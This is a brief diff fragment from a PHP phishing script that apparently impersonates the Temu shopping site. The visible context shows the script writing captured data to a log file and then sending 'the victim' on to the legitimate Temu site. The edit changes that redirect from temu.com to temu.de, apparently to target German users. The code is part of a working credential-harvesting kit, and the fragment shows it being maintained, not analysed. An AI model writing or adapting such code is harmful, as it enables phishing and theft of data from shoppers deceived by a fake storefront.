@@ -95,6 +95,6 @@ file_put_contents('captured_data.log', $log_entry, FILE_APPEND);
 // ============================================
 // Redirect the victim to legitimate Temu
 // ============================================
-header('Location: https://www.temu.com');
+header('Location: https://www.temu.de/');
 exit;
 ?>
